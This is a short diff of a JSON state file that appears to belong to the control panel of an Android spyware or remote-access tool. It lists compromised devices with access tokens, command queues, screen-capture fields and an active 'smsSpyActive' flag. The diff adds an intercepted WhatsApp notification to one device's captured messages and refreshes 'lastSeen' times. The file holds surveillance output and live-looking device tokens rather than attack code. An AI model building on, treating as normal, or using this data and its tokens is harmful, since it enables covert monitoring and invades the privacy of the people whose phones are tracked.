@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776843002237,
+    "lastSeen": 1776843023221,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (14 pesan): ~ Aufatzy",
+        "content": "!SBrat 😹😹",
+        "time": "22/04 15:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776843024477
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -1453,7 +1461,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "2d52258cb0a11a890ba41fac54cda5a3",
-    "lastSeen": 1776843005175,
+    "lastSeen": 1776843023190,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:30:01.375Z",
